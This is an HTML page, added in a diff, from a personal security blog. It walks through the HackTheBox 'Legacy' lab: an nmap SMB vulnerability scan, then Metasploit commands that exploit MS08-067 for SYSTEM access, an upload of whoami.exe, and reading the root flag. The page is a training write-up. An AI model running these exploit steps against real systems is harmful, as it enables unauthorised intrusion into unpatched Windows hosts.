@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    
+        <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@300&family=Montserrat:wght@300&family=Sacramento&display=swap" rel="stylesheet">
+        
+        <link rel="stylesheet" type="text/css" href="../style.css">
+        
+        <title>7s26simon</title>
+        
+    </head>    
+    
+    <body>
+        
+        <div id="top"></div>
+        
+       <div id="top-bar-blue">
+
+            <h1 id="name-font">Simon McCabe</h1>
+
+            <h4>WAPT. OSCP. OSWP. PGCert. BSc. Linux+. Security+.</h4>
+
+            <img id="cloud-one" src="../images/cloud.png" height="50" width="100" alt="cloud">
+
+            <img id="cloud-two" src="../images/cloud.png" height="50" width="100" alt="cloud">  
+
+        </div>
+
+        <div class="topnav">
+
+          <a class="active" href="/index.html">Home</a>
+          <a href="/hackthebox.html">HackTheBox</a>
+          <a href="/tryhackme.html">TryHackMe</a>
+          <a href="/vulnhub.html">Vulnhub</a>
+          <a href="/general.html">General Security</a>
+          <a href="/personal.html">Personal</a>
+          <a href="/About.html">About Me</a>
+
+        </div>
+        
+        <div id="writeup-box-name">
+
+            <p>...Legacy Writeup...</p>
+
+        </div>
+
+        <div id="center-writeup-image">
+
+            <img src="legacy/1.png">
+            
+        </div>
+        
+        <h2>1. Enumeration</h2>
+        
+        <p>Legacy was my first HackTheBox …box. It’s a super easy one to get you into the swing of things. This will be a short writeup on what I did to pown it.<br><br>I ran a basic nmap scan (sV = service version(s)):</p>
+        
+        <img src="legacy/2.png" height=210 width=750>
+        
+       
+     <h2>2. Nmap's NSE (Further enum)</h2>
+     
+     
+        <p>I tried testing smb first, using a guest account to see if it has a password. Next up I honed in on the ports with an nmap script: <pre><code><p class="writeup-strong">(nmap -script smb-vuln -p 139,445 10.10.10.4)</p></pre></code>Running this Nmap scan looking for issues with SMB resulted in a finding for ms08-067:</p>
+        
+        
+        <img src="legacy/3.png" height=500 width=750>
+        
+    
+    <p>I decided to go with the MS08-067 exploit and opened it up in metasploit:</p>
+        
+    <pre><code><p class="writeup-strong">Search MS08-067
+
+    Use 0
+
+    Set RHOSTS 10.10.10.4
+
+    Run</code></pre></p>
+        
+        
+    <p>So now, I was running as SYSTEM but I couldn’t run various commands e.g whoami.
+So I decided to upload it from my local machine:</p>
+        
+        
+    <pre><code><p class="writeup-strong">si@kali:~$ locate whoami.exe
+
+    /usr/share/windows-resources/binaries/whoami.exe</code></pre></a>
+        
+    
+    <p>I ran the following command:</p>
+        
+    <pre><code><p class="writeup-strong">Upload /usr/share/windows-resources/binaries/whoami.exe</code></pre></a>
+     
+    <p>I could now run the command(s) I wanted. And next up, was reading the flag:</p>
+        
+<pre><code><p class="writeup-strong">C:\Documents and Settings\Administrator\Desktop>dir
+
+dir
+
+Volume in drive C has no label.
+
+Volume Serial Number is 54BF-723B
+
+
+Directory of C:\Documents and Settings\Administrator\Desktop
+
+16/03/2017  09:18       DIR          .
+
+16/03/2017  09:18       DIR          ..
+
+16/03/2017  09:18                   32 root.txt
+
+1 File(s)             32 bytes
+
+2 Dir(s)   6.484.148.224 bytes free
+
+
+C:\Documents and Settings\Administrator\Desktop>more root.txt
+
+more root.txt
+
+***hash removed***
+</code></pre></a>
+
+<p>And that was that. First box, done!</p>
+
+<p><a href="#top">Go to top</a></p>
+
+        <div id="social-media">
+
+            <a class="logoWidth" href="https://www.linkedin.com/in/simcc/" target="_blank">
+            <img src="../images/linkedin.PNG" width="25" height="25" alt="linkedin"></a>
+
+            <a class="logoWidth" href="http://twitter.com/7s26simon" target="_blank">
+            <img src="../images/twitter.PNG" width="30" height="25" alt="twitter"></a>
+
+            <a class="logoWidth" href="https://www.youtube.com/channel/UCp8Iiw5FjmwDXKLV91t-j3Q" target="_blank">
+            <img src="../images/youtube.PNG" width="30" height="25" alt="youtube"></a> 
+
+        </div>
+
+        <div id="bottom-bar" >
+
+            <div id="validator">
+
+            <a href="https://validator.w3.org/check?uri=referer"><img
+                  src="http://www.w3.org/Icons/valid-xhtml10"
+                  alt="Valid XHTML 1.0!" height="31" width="88" /></a>
+
+            <p id="footerTag">© 2020 Simon McCabe - 7s26simon.github.io</p>
+
+            </div>
+
+        </div>
+        
+    </body>
+
+</html>
